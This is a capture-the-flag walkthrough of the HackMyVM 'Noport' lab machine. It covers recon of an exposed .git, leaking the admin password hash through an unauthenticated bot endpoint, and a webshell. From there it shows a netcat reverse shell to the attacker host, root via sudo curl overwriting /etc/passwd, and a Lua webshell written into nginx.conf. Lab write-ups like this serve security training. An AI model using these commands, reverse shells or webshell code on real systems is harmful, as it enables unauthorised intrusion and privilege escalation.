# Noport

## Recon

::: details nmap_scan.log
```log
Open 10.0.2.47:80
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -sV -sC -Pn" on ip 10.0.2.47

PORT   STATE SERVICE REASON  VERSION
80/tcp open  http    syn-ack nginx
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-git: 
|   10.0.2.47:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: add some file 
|_http-title: Login
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
```
:::

## HTTP

Login page with nothing else.

![writeup.png](/assets/pentest/hackmyvm/noport/writeup.png)

### Source Code (Git)

Nmap found `.git` exposed, so dump it.

```bash
└─$ git-dumper http://noport.hmv/ noport_git
└─$ cd noport_git/
└─$ ls -Alh
Permissions Size User  Date Modified Name
drwxrwxr-x     - woyag  9 Sep 06:09   .git
.rw-rw-r--   307 woyag  9 Sep 06:09   .htaccess
.rw-rw-r--   12k woyag  9 Sep 06:09   .test.php.swp
.rw-rw-r--  1.0k woyag  9 Sep 06:09   ctf.conf
.rw-rw-r--  4.0k woyag  9 Sep 06:09   index.php
.rwxrwxr-x  1.5k woyag  9 Sep 06:09   nginx.conf
```

Nginx config:
```yaml
└─$ grep -vE '^$|#' nginx.conf
user www-data;
worker_processes auto;
pid /run/nginx.pid;
include /etc/nginx/modules-enabled/*.conf;
events {
        worker_connections 768;
}
http {
        proxy_cache_path /tmp keys_zone=cache:10m max_size=1g inactive=60m use_temp_path=off;
        sendfile on;
        tcp_nopush on;
        tcp_nodelay on;
        keepalive_timeout 65;
        types_hash_max_size 2048;
        server_tokens off;
        include /etc/nginx/mime.types;
        default_type application/octet-stream;
        ssl_prefer_server_ciphers on;
        access_log /var/log/nginx/access.log;
        error_log /var/log/nginx/error.log;
        gzip on;
        include /var/www/html/ctf.conf;
}

└─$ cat ctf.conf
server {
        listen 80;
        root /var/www/html;
        index index.php;

        location ~ .*\.(css|js|png|jpg)$ {
            proxy_cache cache;
            proxy_cache_valid 200 3m;
            proxy_cache_use_stale error timeout updating;
            expires 3m;
            add_header Cache-Control "public";
            add_header X-Cache $upstream_cache_status;
            proxy_pass http://127.0.0.1:8080;
            proxy_set_header Host $host;
            proxy_set_header X-Real-IP $remote_addr;
            proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
            proxy_set_header X-Forwarded-Proto $scheme;
        }
        location / {
            proxy_pass http://127.0.0.1:8080;
            proxy_set_header Host $host;
            proxy_set_header X-Real-IP $remote_addr;
            proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
            proxy_set_header X-Forwarded-Proto $scheme;
        }
        access_log /var/log/nginx/access.log;
        error_log /var/log/nginx/error.log;
}
```

Source:
```php
└─$ cat index.php
<?php
session_start();
$uri = $_SERVER['REQUEST_URI'];
$path = trim(parse_url($uri, PHP_URL_PATH), '/');

function verify_user() {
    if (!isset($_SESSION['username'])) { header('HTTP/1.1 401 Unauthorized'); echo json_encode(["error" => "Please login first"]); exit; }
    return $_SESSION['username'];
}

function get_db_connection() { $db = new SQLite3('/var/www/html/database.db'); return $db; }

if ($_SERVER['REQUEST_METHOD'] === 'POST' && $path === 'visit') {
    #$username = verify_user();
    $uri = $_POST['uri'] ?? '';
    if (empty($uri)) { header('HTTP/1.1 400 Bad Request'); echo json_encode(["error" => "URI is required"]); exit; }

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "http://127.0.0.1:8080/test.php?uri=" . urlencode($uri));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, [ "Host: 127.0.0.1:8080" ]);
    $res=curl_exec($ch);
    if (curl_errno($ch)) { error_log("cURL error calling test.php: " . curl_error($ch)); } 
    else { error_log("test.php response: " . $response); }
    curl_close($ch);

    header('Content-Type: application/json');
    echo json_encode(["message" => "Bot is visiting: $uri"]);
    exit;
}

if ($_SERVER['REQUEST_METHOD'] === 'POST' && $path === 'login') {
    $username = $_POST['username'] ?? '';
    $password = hash('sha256', $_POST['password']) ?? '';

    $db = get_db_connection();
    $stmt = $db->prepare('SELECT * FROM users WHERE username = :username AND password = :password');
    $stmt->bindValue(':username', $username, SQLITE3_TEXT);
    $stmt->bindValue(':password', $password, SQLITE3_TEXT);
    $result = $stmt->execute();
    $user = $result->fetchArray(SQLITE3_ASSOC);

    if ($user) { $_SESSION['username'] = $user['username']; echo json_encode(["message" => "Logged in successfully"]); header('Location: sh3ll.php'); } 
    else { header('HTTP/1.1 401 Unauthorized'); echo json_encode(["error" => "Invalid credentials"]); }
    $db->close();
    exit;
}

if (!empty($path)) {
    $username = verify_user();
    $db = get_db_connection();
    if (preg_match('/^profile/', $path)) {
        $stmt = $db->prepare('SELECT id, username, email, password, api_key, created_at FROM users WHERE username = :username');
        $stmt->bindValue(':username', $username, SQLITE3_TEXT);
        $result = $stmt->execute();
        $user = $result->fetchArray(SQLITE3_ASSOC);

        if ($user) {
            header('Content-Type: application/json');
			header_remove("Cache-Control");
			header_remove("Pragma");
			header_remove("Expires");
            echo json_encode([
                "id" => $user['id'],
                "username" => $user['username'],
                "email" => $user['email'],
                "password" => $user['password'],
                "api_key" => $user['api_key'],
                "created_at" => $user['created_at']
            ]);
        } else {
            header('HTTP/1.1 404 Not Found');
			header_remove("Cache-Control");
			header_remove("Pragma");
			header_remove("Expires");
            echo json_encode(["error" => "User not found"]);
        }
    } else {
        $file_path = '/var/www/html/' . $path;
        if (file_exists($file_path)) {
            readfile($file_path);
        } else {
                header('HTTP/1.1 404 Not Found');
                header_remove("Cache-Control");
                header_remove("Pragma");
                header_remove("Expires");
            echo json_encode(["error" => "No match"]);
        }
    }
    $db->close();
    exit;
}


?>
<!DOCTYPE html>
<html>
<head><title>Login</title></head>
<body>
    <h2>Login</h2>
    <form method="post" action="/login">
        Username: <input type="text" name="username"><br>
        Password: <input type="password" name="password"><br>
        <input type="submit" value="Login">
    </form>
</body>
</html>
```

There's also source code for `test.php`, but in `swp` format
```php
└─$ vim -r .test.php.swp
# In VIM do
:w ./test.php
:q

└─$ cat test.php
<?php
//czj
if ($_SERVER['REMOTE_ADDR'] !== '127.0.0.1') { header('HTTP/1.1 403 Forbidden'); echo "Access Denied"; exit; }

$admin_password=getenv('ADMIN_PASS');
$base_url = 'http://127.0.0.1:80';
$log_file = __DIR__ . '/log';

function write_log($message) { 
	global $log_file; 
	$timestamp = date('Y-m-d H:i:s');
	$log_entry = "[$timestamp] $message\n"; 
	file_put_contents($log_file, $log_entry, FILE_APPEND);
}

function login_and_get_cookie() {
    global $base_url, $admin_password;
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "$base_url/login");
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query([ 'username' => 'admin', 'password' => $admin_password ]));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HEADER, true);
    curl_setopt($ch, CURLOPT_COOKIEJAR, '');
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, false);

    $headers = [
        'User-Agent: Bot',
        'Accept: application/json',
        'Content-Type: application/x-www-form-urlencoded'
    ];
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

    $response = curl_exec($ch);
    if (curl_errno($ch)) { write_log("cURL login error: " . curl_error($ch)); curl_close($ch); return null; }

    $header_size = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
    $header = substr($response, 0, $header_size);
    curl_close($ch);

    preg_match('/PHPSESSID=([^;]+)/', $header, $matches);
    return $matches[1] ?? null;
}

function bot_runner($uri) {
    global $base_url;
    $cookie = login_and_get_cookie();

    if (!$cookie) { write_log("Failed to get admin cookie"); return; }

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "$base_url/$uri");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_COOKIE, "PHPSESSID=$cookie");
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_COOKIEFILE, '');

    $response = curl_exec($ch);
    if (curl_errno($ch)) { write_log("cURL visit error: " . curl_error($ch)); } 
    else { write_log("Bot visited $uri, response: " . substr($response, 0, 100)); }
    curl_close($ch);
    sleep(1);
}

if (isset($_GET['uri'])) {
    $uri = $_GET['uri'];
    write_log("Bot triggered for URI: $uri");
    bot_runner($uri);
    echo "Bot executed";
}
```

### Leak Password

Only admin can login into the application and password is stored in environment, we don't have access to database file directly (403), but we can use bot to do actions for us. `verify_user` is disabled on `/visit` so it doesn't require authentication. 

We can observe what **bot** did in `/log`
```bash
└─$ curl http://noport.hmv/visit --data-urlencode 'uri=http://10.0.2.15/hello'
└─$ curl http://noport.hmv/visit --data-urlencode 'uri=file:///var/www/html/database.db'
└─$ curl http://noport.hmv/visit --data-urlencode 'uri=http://127.0.0.1/log'
└─$ curl http://noport.hmv/visit --data-urlencode 'uri=http://10.0.2.47/log'
└─$ curl http://noport.hmv/visit --data-urlencode 'uri=profile'
└─$ curl http://noport.hmv/visit --data-urlencode 'uri=log'

└─$ curl http://noport.hmv/log
[2025-09-09 14:34:37] Bot visited http://10.0.2.15/hello, response: {"error":"No match"}
[2025-09-09 14:35:04] Bot visited file:///var/www/html/database.db, response: <html>
<head><title>403 Forbidden</title></head>
<body>
<center><h1>403 Forbidden</h1></center>

[2025-09-09 14:38:49] Bot visited http://127.0.0.1/log, response: {"error":"No match"}
[2025-09-09 14:38:59] Bot visited http://10.0.2.47/log, response: {"error":"No match"}
[2025-09-09 14:40:21] Bot visited profile, response: {"id":1,"username":"admin","email":"admin@example.com","password":"6f06ee724b86fca512018ad692a62aedc
[2025-09-09 14:40:27] Bot visited log, response: [2025-09-09 14:34:37] Bot visited http://10.0.2.15/hello, response: {"error":"No match"}
[2025-09-09
```

[https://crackstation.net](https://crackstation.net) and [https://md5hashing.net](https://md5hashing.net) failed to get hash, however [https://www.cmd5.org](https://www.cmd5.org) worked.

![writeup-1.png](/assets/pentest/hackmyvm/noport/writeup-1.png)

### Webshell

::: tip Creds
`admin:shredder1`
:::

![writeup-2.png](/assets/pentest/hackmyvm/noport/writeup-2.png)

I wasn't able to get TTY so I ended up with **Penelope** and **socat** (upload)
```bash
└─$ penelope -p 4444
---
└─$ curl http://noport.hmv/sh3ll.php -b 'PHPSESSID=mhl5vv3uegc598kn22tmp8n2qe' -s --data-urlencode 'command=nc 10.0.2.15 4444 -e /bin/bash' | htmlq pre -t
---
bash-5.0$ id
uid=101(apache) gid=102(apache) groups=82(www-data),102(apache),102(apache)
bash-5.0$ sudo -l
User apache may run the following commands on noport:
    (root) NOPASSWD: /sbin/reboot
```

User `apache` has ability to restart the box.

```bash
bash-5.0$ cd ../..
bash-5.0$ ls -alh
total 16K
drwxr-xr-x    3 root     root        4.0K Apr 20 21:43 .
drwxr-xr-x   14 root     root        4.0K Apr 20 18:22 ..
drwxr-xr-x    4 root     root        4.0K Apr 20 13:45 localhost
lrwxrwxrwx    1 root     root          16 Apr 20 13:45 logs -> /var/log/apache2
lrwxrwxrwx    1 root     root          16 Apr 20 13:45 modules -> /usr/lib/apache2
-rw-r--r--    1 root     root         129 Apr 20 21:44 pass
lrwxrwxrwx    1 root     root          12 Apr 20 13:45 run -> /run/apache2
bash-5.0$ cat pass
To prevent myself fron forgetting my password,i set my password to be the same as the website password so that i wont forget it!
bash-5.0$ grep sh$ /etc/passwd
root:x:0:0:root:/root:/bin/ash
akaRed:x:1000:1000:Linux User,,,:/home/akaRed:/bin/ash
```

SSH is open locally
```bash
bash-5.0$ netstat -an
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN
tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN
tcp        0      0 127.0.0.1:22            0.0.0.0:*               LISTEN
```

## SSH (Internal)

```bash
bash-5.0$ ssh akaRed@0
akaRed@0.0.0.0 password: shredder1
noport:~$ id
uid=1000(akaRed) gid=1000(akaRed) groups=1000(akaRed)
```

### User.txt

```bash
noport:~$ cat user.txt
flag{UR_s0_Good_*n-n3tvv0rk_For_660930334}
```

## Privilege Escalation 

```bash
noport:~$ sudo -l
User akaRed may run the following commands on noport:
    (root) NOPASSWD: /usr/bin/curl
    (root) NOPASSWD: /sbin/reboot
```

```bash
noport:~$ cp /etc/passwd .
noport:~$ echo "pwn:$(openssl passwd -6 -salt y x):0:0:root:/root:/bin/bash" >> passwd
noport:~$ sudo curl file:///home/akaRed/passwd -so /etc/passwd
noport:~$ su - pwn
-ash: su: Permission denied
noport:~$ ssh pwn@0
pwn@0.0.0.0 password: x
noport:~# id
uid=0(root) gid=0(root) groups=0(root)
```

### Root.txt

```bash
noport:~# cat /root/root.txt
flag{Ur_t3h_Trvely_n3tvv0rk_@ce_on_QQGroup}
```

## Possible Alternative Ways

We have ability to restart the machine meaning some services during boot up will be affected. We can try targeting **nginx**, if we find config files related to it with **write** permission by **all** then we find that main config file is writable!
```bash
bash-5.0$ find / -type f -name '*nginx*' -perm -0002 -exec ls -lh {} \; 2>/dev/null
-rwxrwxrwx    1 root     root        2.4K Apr 21 15:36 /etc/nginx/nginx.conf
```

This nginx installation also supports contains [lua-nginx-module](https://github.com/openresty/lua-nginx-module)
```bash
bash-5.0$ nginx -V 2>&1 | tr ' ' '\n' | grep lua -i
--add-dynamic-module=/home/buildozer/aports/main/nginx/src/lua-nginx-module-0.10.15
--add-dynamic-module=/home/buildozer/aports/main/nginx/src/lua-upstream-nginx-module-0.07
```

### RCE (Try 1)

Perform test before going after target with limited access
```bash
FROM openresty/openresty:alpine
COPY nginx.conf /usr/local/openresty/nginx/conf/nginx.conf
EXPOSE 8080
CMD ["/usr/local/openresty/bin/openresty", "-g", "daemon off;"]
```

```lua
worker_processes auto;

events {
    worker_connections 3; 
}

http { 
    server {
        listen 8080;

        location /exec {
            content_by_lua_block {
                ngx.req.read_body()
                local args = ngx.req.get_post_args()
                local cmd = args["cmd"]

                if cmd then
                    local handle = io.popen(cmd)
                    local result = handle:read("*a")
                    handle:close()

                    ngx.say(result)
                else
                    ngx.say("No cmd parameter")
                end
            }
        }
    }
}
```

Nice and small webshell~
```bash
└─$ docker build -t openresty-lua .
└─$ docker run --rm -p 8080:8080 openresty-lua
└─$ curl 0:8080/exec -d 'cmd=id'
uid=65534(nobody) gid=65534(nobody) groups=65534(nobody)
```

If you change he user by adding `user root;` you get RCE by user, *important*.
```bash
└─$ curl 0:8080/exec -d 'cmd=id'
uid=0(root) gid=0(root) groups=0(root),0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
```

Store backup just in case
```bash
bash-5.0$ cp /etc/nginx/nginx.conf /tmp
```

Update
```bash
user root;
worker_processes auto;
pcre_jit on;
error_log /var/log/nginx/error.log warn;
include /etc/nginx/modules/*.conf;
events {
        worker_connections 1024;
}
http {
    proxy_cache_path /tmp keys_zone=cache:10m max_size=1g inactive=60m use_temp_path=off;
    include /etc/nginx/mime.types;
    default_type application/octet-stream;
    server_tokens off;
    client_max_body_size 1m;
    keepalive_timeout 65;
    sendfile on;
    tcp_nodelay on;
    ssl_prefer_server_ciphers on;
    ssl_session_cache shared:SSL:2m;
    gzip_vary on;
    log_format main '$remote_addr - $remote_user [$time_local] "$request" '
                    '$status $body_bytes_sent "$http_referer" '
                    '"$http_user_agent" "$http_x_forwarded_for"';
    access_log /var/log/nginx/access.log main;
    include /etc/nginx/conf.d/*.conf;

    server {
        listen 8000;

        location /exec {
            content_by_lua_block {
                ngx.req.read_body()
                local args = ngx.req.get_post_args()
                local cmd = args["cmd"]

                if cmd then
                    local handle = io.popen(cmd)
                    local result = handle:read("*a")
                    handle:close()

                    ngx.say(result)
                else
                    ngx.say("No cmd parameter")
                end
            }
        }
    }
}
```

Transfer
```bash
bash-5.0$ echo 'dXNlciByb290Ow0Kd29ya2VyX3Byb2Nlc3NlcyBhdXRvOw0KcGNyZV9qaXQgb247DQplcnJvcl9sb2cgL3Zhci9sb2cvbmdpbngvZXJyb3IubG9nIHdhcm47DQppbmNsdWRlIC9ldGMvbmdpbngvbW9kdWxlcy8qLmNvbmY7DQpldmVudHMgew0KICAgICAgICB3b3JrZXJfY29ubmVjdGlvbnMgMTAyNDsNCn0NCmh0dHAgew0KICAgIHByb3h5X2NhY2hlX3BhdGggL3RtcCBrZXlzX3pvbmU9Y2FjaGU6MTBtIG1heF9zaXplPTFnIGluYWN0aXZlPTYwbSB1c2VfdGVtcF9wYXRoPW9mZjsNCiAgICBpbmNsdWRlIC9ldGMvbmdpbngvbWltZS50eXBlczsNCiAgICBkZWZhdWx0X3R5cGUgYXBwbGljYXRpb24vb2N0ZXQtc3RyZWFtOw0KICAgIHNlcnZlcl90b2tlbnMgb2ZmOw0KICAgIGNsaWVudF9tYXhfYm9keV9zaXplIDFtOw0KICAgIGtlZXBhbGl2ZV90aW1lb3V0IDY1Ow0KICAgIHNlbmRmaWxlIG9uOw0KICAgIHRjcF9ub2RlbGF5IG9uOw0KICAgIHNzbF9wcmVmZXJfc2VydmVyX2NpcGhlcnMgb247DQogICAgc3NsX3Nlc3Npb25fY2FjaGUgc2hhcmVkOlNTTDoybTsNCiAgICBnemlwX3Zhcnkgb247DQogICAgbG9nX2Zvcm1hdCBtYWluICckcmVtb3RlX2FkZHIgLSAkcmVtb3RlX3VzZXIgWyR0aW1lX2xvY2FsXSAiJHJlcXVlc3QiICcNCiAgICAgICAgICAgICAgICAgICAgJyRzdGF0dXMgJGJvZHlfYnl0ZXNfc2VudCAiJGh0dHBfcmVmZXJlciIgJw0KICAgICAgICAgICAgICAgICAgICAnIiRodHRwX3VzZXJfYWdlbnQiICIkaHR0cF94X2ZvcndhcmRlZF9mb3IiJzsNCiAgICBhY2Nlc3NfbG9nIC92YXIvbG9nL25naW54L2FjY2Vzcy5sb2cgbWFpbjsNCiAgICBpbmNsdWRlIC9ldGMvbmdpbngvY29uZi5kLyouY29uZjsNCg0KICAgIHNlcnZlciB7DQogICAgICAgIGxpc3RlbiA4MDAwOw0KDQogICAgICAgIGxvY2F0aW9uIC9leGVjIHsNCiAgICAgICAgICAgIGNvbnRlbnRfYnlfbHVhX2Jsb2NrIHsNCiAgICAgICAgICAgICAgICBuZ3gucmVxLnJlYWRfYm9keSgpDQogICAgICAgICAgICAgICAgbG9jYWwgYXJncyA9IG5neC5yZXEuZ2V0X3Bvc3RfYXJncygpDQogICAgICAgICAgICAgICAgbG9jYWwgY21kID0gYXJnc1siY21kIl0NCg0KICAgICAgICAgICAgICAgIGlmIGNtZCB0aGVuDQogICAgICAgICAgICAgICAgICAgIGxvY2FsIGhhbmRsZSA9IGlvLnBvcGVuKGNtZCkNCiAgICAgICAgICAgICAgICAgICAgbG9jYWwgcmVzdWx0ID0gaGFuZGxlOnJlYWQoIiphIikNCiAgICAgICAgICAgICAgICAgICAgaGFuZGxlOmNsb3NlKCkNCg0KICAgICAgICAgICAgICAgICAgICBuZ3guc2F5KHJlc3VsdCkNCiAgICAgICAgICAgICAgICBlbHNlDQogICAgICAgICAgICAgICAgICAgIG5neC5zYXkoIk5vIGNtZCBwYXJhbWV0ZXIiKQ0KICAgICAgICAgICAgICAgIGVuZA0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQogICAgfQ0KfQ0K' | base64 -d > /etc/nginx/nginx.conf
```

Reboot
```bash
bash-5.0$ sudo /sbin/reboot
```

It fails because it doesn't recognize Lua as part of it's modules... (?) (Bad compile?)

![writeup-3.png](/assets/pentest/hackmyvm/noport/writeup-3.png)

### Port Forward (Try 2)

Since only stream module exists we can utilize it.
```yaml
user root;
worker_processes auto;
pcre_jit on;
error_log /var/log/nginx/error.log warn;
include /etc/nginx/modules/*.conf;
events {
        worker_connections 1024;
}
http {
    proxy_cache_path /tmp keys_zone=cache:10m max_size=1g inactive=60m use_temp_path=off;
    include /etc/nginx/mime.types;
    default_type application/octet-stream;
    server_tokens off;
    client_max_body_size 1m;
    keepalive_timeout 65;
    sendfile on;
    tcp_nodelay on;
    ssl_prefer_server_ciphers on;
    ssl_session_cache shared:SSL:2m;
    gzip_vary on;
    log_format main '$remote_addr - $remote_user [$time_local] "$request" '
                    '$status $body_bytes_sent "$http_referer" '
                    '"$http_user_agent" "$http_x_forwarded_for"';
    access_log /var/log/nginx/access.log main;
    include /etc/nginx/conf.d/*.conf;
}
stream {
    # SSH proxy on port 2222 -> forward to localhost:22
    server {
        listen 2222;
        proxy_pass 127.0.0.1:22;
    }
}
```

This again doesn't work because it has a firewall.
```bash
noport:~# netstat -an
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN
tcp        0      0 0.0.0.0:2222            0.0.0.0:*               LISTEN
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN
tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN

└─$ nmap -p22,2222 10.0.2.48
PORT     STATE    SERVICE
22/tcp   open     ssh
2222/tcp filtered EtherNetIP-1
```

Only port 80 is exposed and allowed to receive connections.
```bash
noport:~# iptables -vnL INPUT --line-numbers
Chain INPUT (policy DROP 44 packets, 4704 bytes)
num   pkts bytes target     prot opt in     out     source               destination
2      129 20442 ACCEPT     all  --  lo     *       0.0.0.0/0            0.0.0.0/0
3       32  5585 ACCEPT     all  --  *      *       0.0.0.0/0            0.0.0.0/0            ctstate RELATED,ESTABLISHED
4        5   300 ACCEPT     tcp  --  *      *       0.0.0.0/0            0.0.0.0/0            tcp dpt:80 ctstate NEW
5        0     0 DROP       all  --  *      *       0.0.0.0/0            0.0.0.0/0            ctstate INVALID
6        0     0            tcp  --  *      *       0.0.0.0/0            0.0.0.0/0            tcp dpt:80 ctstate NEW recent: SET name: HTTP side: source mask: 255.255.255.255
7        0     0 DROP       tcp  --  *      *       0.0.0.0/0            0.0.0.0/0            tcp dpt:80 ctstate NEW recent: UPDATE seconds: 30 hit_count: 10 name: HTTP side: source mask: 255.255.255.255
```